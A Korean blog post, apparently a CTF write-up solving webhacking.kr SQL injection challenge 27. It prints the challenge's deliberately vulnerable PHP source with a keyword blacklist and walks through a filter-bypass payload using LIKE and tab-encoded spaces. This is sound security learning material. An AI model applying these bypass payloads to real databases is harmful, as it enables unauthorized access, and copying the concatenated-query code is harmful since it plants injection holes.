---
title: "Security: webhacking.kr 27-31"
last_modified_at: 2020-07-26T20:20:02-05:00
categories:
  - Security
tags:
  - webhacking.kr
  - 웹해킹
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---
---
### 27
---

27번 문제 역시 SQL Injection이다. 일단 true를 입력해보았다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제27/27-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

guest 라는 문자열이 나타난다 1을 입력하면 guest 계정이 나타나는 모양이다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제27/27-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>

그외에 문법에 어긋나면 query error가 나타나고 특정한 단어를 입력하면 no hack이 출력된다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제27/27-3.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제27/27-4.JPG" alt="">
  <figcaption> </figcaption>
</figure>

이것만으로는 힌트가 부족한것 같아서 소스코드를 살펴보았다.
{: .notice}

```
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 27</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get action=index.php>
<input type=text name=no><input type=submit>
</form>
<?php
  if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
<br><a href=?view_source=1>view-source</a>
</body>
</html>
```

여기서 주목해야할 부분은 아래 세 줄이다.
{: .notice}
```
if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");

$r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})"))

if($r['id']=="admin") solve(27); // admin's no = 2
```

정규 표현식으로 #, select, (, " ", limit, =, 0x 는 사용하지 못하도록 필터링 하고 있다. 
이 표현들을 피하여 아래처럼 입력하여 2가 들어가도록 하면 된다. (admin's no = 2 이므로) 
{: .notice}

```
select id from chall27 where id='guest' and no=(0) or no like 2--
```

여기서 no = 2를 입력하고 싶었지만 =는 필터링이 되기 때문에 대신해서 like를 사용했고
 0) or no like 2--을 입력하기 위해 url encode 방식에 따라서 공백문자를 %09로 치환하였다.
{: .notice}

```
0)%09or%09no%09like%092%09--%09
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제27/27-5.JPG" alt="">
  <figcaption> </figcaption>
</figure>

그리고 나서 그대로 입력창에 입력하니 query error 란다. 입력창에 입력하게 되면 한번더 url endcode가 되기때문에 의도한 값과는 다른 값이 들어가게된다.
따라서 직접 주소창에 ?no= 뒤에 넣어줘야한다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제27/27-6.JPG" alt="">
  <figcaption> </figcaption>
</figure>







